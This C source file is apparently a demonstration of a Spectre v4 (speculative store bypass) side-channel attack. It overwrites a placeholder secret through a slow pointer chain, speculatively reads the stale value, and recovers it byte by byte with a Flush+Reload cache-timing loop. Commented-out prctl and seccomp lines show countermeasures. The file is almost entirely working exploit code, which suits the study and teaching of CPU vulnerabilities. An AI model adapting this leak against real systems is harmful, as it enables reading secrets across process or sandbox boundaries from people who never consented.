#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <seccomp.h>
#include <linux/seccomp.h>
#include <x86intrin.h>


// inaccessible (overwritten) secret
#define SECRET      "SEC"
#define OVERWRITE   '#'
#define CACHE_MISS 120

char* data;
char* mem;
int junk = 0;

void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }

// ---------------------------------------------------------------------------
void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

int flush_reload_t(void *ptr) {
  register uint64_t start = 0, end = 0;
  start = __rdtscp(&junk);
  maccess(ptr);

  end = __rdtscp(&junk);
  _mm_mfence();
  flush(ptr);

  return (int)(end - start);
}

char access_array(int x) {
  // store secret in data
  uint64_t start, end;
  strcpy(data, SECRET);

  // flushing the data which is used in the condition increases
  // probability of speculation
  _mm_mfence();
  char** data_slowptr = &data;
  char*** data_slowslowptr = &data_slowptr;
  char**** data_ultraslowptr = &data_slowslowptr;
  _mm_mfence();
  flush(&x);
  flush(data_slowptr);
  flush(&data_slowptr);
  flush(data_slowslowptr);
  flush(&data_slowslowptr);
  flush(data_ultraslowptr);
  flush(&data_ultraslowptr);
  // ensure data is flushed at this point
  _mm_mfence();

  // overwrite data via different pointer
  // pointer chasing makes this extremely slow
  //start = rdtsc();
  (*(*(*data_ultraslowptr)))[x] = OVERWRITE;
  //end = rdtsc();

  // data[x] should now be "#"
  // uncomment next line to break attack
  //_mm_mfence();
  // Encode stale value in the cache
  maccess(mem + data[x]*4096);
  /* _mm_mfence();
  printf("time to deref: %d", end - start); */
}

void cache_decode_pretty(char *leaked, int index) {
  printf("\n\n");
  for(int i = 0; i < 256; i++) {
    int mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
    if(flush_reload_t(mem + mix_i * 4096) < CACHE_MISS) {
      if((mix_i >= 'A' && mix_i <= 'Z') && leaked[index] == ' ') {
        leaked[index] = mix_i;
        printf("\x1b[33m%s\x1b[0m\r", leaked);
      }
      fflush(stdout);
      sched_yield();
    }
  }
}

int main(int argc, const char **argv) {
  data = malloc(128);
  // Detect cache threshold
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
  
  int pagesize = 4096;
  // countermeasure:
  // prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_STORE_BYPASS, PR_SPEC_DISABLE, 0, 0);

// countermeasure 2:
  // prctl(PR_SET_NO_NEW_PRIVS, 1);
  // prctl(PR_SET_DUMPABLE, 0);
  // scmp_filter_ctx ctx;
  // ctx = seccomp_init(SCMP_ACT_ALLOW);
  // seccomp_load(ctx);
  //

  char *_mem = malloc(pagesize * (256 + 4));
  // page aligned
  mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
  // initialize memory
  memset(mem, 0, pagesize * 256);

  // store secret
  strcpy(data, SECRET);

  // Flush our shared memory
  for(int j = 0; j < 256; j++) {
    _mm_clflush(mem + j * pagesize);
  }

  // nothing leaked so far
  char leaked[sizeof(SECRET) + 1];
  memset(leaked, ' ', sizeof(leaked));
  leaked[sizeof(SECRET)] = 0;

  int j = 0;
  for (int i =0; i < 100; i++) {
    // for every byte in the string
    j = (j + 1) % sizeof(SECRET);

    // overwrite value with X, then access
    access_array(j);

    _mm_mfence(); // avoid speculation
    // Recover data from covert channel
    cache_decode_pretty(leaked, j);

    if(!strncmp(leaked, SECRET, sizeof(SECRET) - 1))
      break;

    sched_yield();
  }
  printf("\n\n[\x1b[32m>\x1b[0m] Done\n");

  return 0;
}
